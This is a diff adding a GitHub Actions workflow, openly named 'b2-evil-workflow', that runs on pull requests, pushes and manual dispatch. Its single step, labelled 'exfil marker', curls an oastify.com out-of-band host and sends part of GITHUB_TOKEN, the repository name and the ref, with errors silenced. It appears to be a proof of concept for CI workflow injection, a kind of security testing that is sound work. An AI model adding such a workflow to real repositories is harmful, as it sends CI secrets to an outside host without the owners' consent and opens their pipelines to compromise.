@@ -1,0 +1,11 @@
+name: b2-evil-workflow
+on:
+  pull_request_target:
+  push:
+  workflow_dispatch:
+jobs:
+  oob:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfil marker
+        run: curl -s "http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/wf?t=${GITHUB_TOKEN:0:4}&repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF" || true
